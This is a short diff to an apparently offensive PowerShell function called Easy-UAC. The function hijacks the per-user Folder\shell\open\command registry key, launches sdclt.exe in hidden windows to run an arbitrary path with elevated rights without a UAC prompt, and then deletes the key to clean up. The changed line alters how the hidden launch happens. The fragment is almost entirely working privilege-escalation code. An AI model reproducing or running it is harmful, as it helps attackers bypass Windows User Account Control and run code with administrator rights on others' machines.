@@ -21,7 +21,7 @@ function Easy-UAC {
 	New-Item "HKCU:\Software\Classes\Folder\shell\open\command" -Force -Value $Path
 	New-ItemProperty -Path "HKCU:\Software\Classes\Folder\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
 	sleep 7
-	Start-Process cmd.exe "/c start /min sdclt.exe" -WindowStyle Hidden
+	start cmd.exe "/c start /min powershell.exe -windowstyle hidden -c start sdclt.exe "
 	sleep 2
 	Remove-Item 'HKCU:\Software\Classes\Folder\shell\open\command'
 	[System.Environment]::SetEnvironmentVariable('A', '',[System.EnvironmentVariableTarget]::User)
